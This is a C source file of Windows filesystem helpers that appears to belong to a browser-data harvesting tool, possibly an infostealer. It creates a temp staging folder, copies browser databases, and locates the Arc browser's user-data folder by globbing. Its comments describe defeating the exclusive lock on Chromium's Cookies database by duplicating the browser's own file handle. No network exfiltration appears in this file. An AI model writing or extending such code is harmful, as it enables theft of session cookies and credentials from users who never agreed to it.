/* bd_fs.c - filesystem helpers: temp staging dir, file read/write/copy with
 * retry (locked browser DBs), single-component glob, mkdir. */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "bd.h"

extern void  *malloc(size_t);
extern void   free(void *);
extern void  *memset(void *, int, size_t);
extern void  *memcpy(void *, const void *, size_t);
extern size_t strlen(const char *);
extern int    _snprintf(char *, size_t, const char *, ...);

int bd_mkdir(const char *path) {
    if (!path || !*path) return -1;
    if (CreateDirectoryA(path, NULL)) return 0;
    return GetLastError() == ERROR_ALREADY_EXISTS ? 0 : -1;
}

int bd_dir_exists(const char *path) {
    DWORD a = GetFileAttributesA(path);
    return (a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY)) ? 1 : 0;
}

int bd_rmdir(const char *path) {
    if (!path || !*path) return -1;
    return RemoveDirectoryA(path) ? 0 : -1;
}

char *bd_temp_dir(void) {
    char base[300], path[340];
    UINT n;
    n = GetTempPathA(sizeof(base), base);
    if (n == 0 || n >= sizeof(base) - 20) return NULL;
    if (base[n - 1] == '\\') base[n - 1] = 0;
    if (!bd_path_join(path, sizeof(path), base, "hbd")) return NULL;
    bd_mkdir(path);
    return bd_strdup(path);
}

int bd_read_file(const char *path, char **dataOut, size_t *lenOut) {
    HANDLE h;
    LARGE_INTEGER sz;
    char *buf;
    DWORD got = 0;
    *dataOut = NULL; *lenOut = 0;
    h = CreateFileA(path, GENERIC_READ,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    if (!GetFileSizeEx(h, &sz) || sz.QuadPart > (LONGLONG)(64ull << 20)) {
        CloseHandle(h);
        return -1;
    }
    buf = (char *)malloc((size_t)sz.QuadPart + 1);
    if (!buf) { CloseHandle(h); return -1; }
    if (sz.QuadPart > 0 && !ReadFile(h, buf, (DWORD)sz.QuadPart, &got, NULL)) {
        free(buf); CloseHandle(h); return -1;
    }
    CloseHandle(h);
    buf[got] = 0;
    *dataOut = buf;
    *lenOut = (size_t)got;
    return 0;
}

int bd_write_file(const char *path, const char *data, size_t len) {
    HANDLE h;
    DWORD put = 0;
    h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    if (len && !WriteFile(h, data, (DWORD)len, &put, NULL)) {
        CloseHandle(h);
        return -1;
    }
    CloseHandle(h);
    return 0;
}

int bd_copy_file(const char *src, const char *dst) {
    int attempt;
    for (attempt = 0; attempt < 3; attempt++) {
        if (CopyFileA(src, dst, FALSE)) return 0;
        Sleep(50 * (attempt + 1));
    }
    /* Exclusive-locked DB (Chromium Cookies) -> duplicate the browser's handle */
    if (bd_copy_locked_file(src, dst) == 0) return 0;
    return -1;
}

/* Expand a path whose single '*' sits at the END of one component, e.g.
 *   C:\Users\<u>\AppData\Local\Packages\TheBrowserCompany.Arc_[star] + /LocalCache/Local/Arc/User Data
 * For each matching child, cb() receives dir + child + remainder. */
typedef struct {
    const char *after;   /* remainder after the wildcard component (may be "") */
    int (*cb)(const char *path, void *ctx);
    void *ctx;
    int count;
} globctx;

static int glob_matches(const char *name, const char *prefix, size_t plen) {
    size_t n = strlen(name);
    return n >= plen && memcmp(name, prefix, plen) == 0;
}

static int glob_emit(const char *dirpath, const char *prefix, globctx *g) {
    char full[600];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    size_t plen = strlen(prefix);
    int before = g->count;

    _snprintf(full, sizeof(full), "%s\\*", dirpath);
    h = FindFirstFileA(full, &fd);
    if (h == INVALID_HANDLE_VALUE) return 0;
    do {
        char candidate[700];
        size_t used, left;
        if (fd.cFileName[0] == '.') continue;
        if (!glob_matches(fd.cFileName, prefix, plen)) continue;
        _snprintf(candidate, sizeof(candidate), "%s\\%s", dirpath, fd.cFileName);
        used = strlen(candidate);
        left = strlen(g->after);
        if (used + left + 1 < sizeof(candidate))
            memcpy(candidate + used, g->after, left + 1);
        g->cb(candidate, g->ctx);
        g->count++;
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return g->count - before;
}

int bd_glob1(const char *pattern, int (*cb)(const char *path, void *ctx), void *ctx) {
    char dir[560], prefix[280];
    const char *star, *compStart, *compEnd;
    globctx g;
    size_t dn;

    if (!pattern || !cb) return 0;
    star = strchr(pattern, '*');
    if (!star) {
        if (bd_dir_exists(pattern)) { cb(pattern, ctx); return 1; }
        return 0;
    }
    /* component containing the star */
    compStart = star;
    while (compStart > pattern && compStart[-1] != '\\' && compStart[-1] != '/') compStart--;
    compEnd = star;
    while (*compEnd && *compEnd != '\\' && *compEnd != '/') compEnd++;

    dn = (size_t)(compStart - pattern);
    if (dn > 0) dn--;                 /* drop trailing separator */
    if (dn >= sizeof(dir)) dn = sizeof(dir) - 1;
    memcpy(dir, pattern, dn); dir[dn] = 0;

    {
        size_t pn = (size_t)(star - compStart);
        if (pn >= sizeof(prefix)) pn = sizeof(prefix) - 1;
        memcpy(prefix, compStart, pn); prefix[pn] = 0;
    }

    g.after = compEnd;               /* e.g. "/LocalCache/Local/Arc/User Data" */
    g.cb = cb; g.ctx = ctx; g.count = 0;
    glob_emit(dir, prefix, &g);
    return g.count;
}
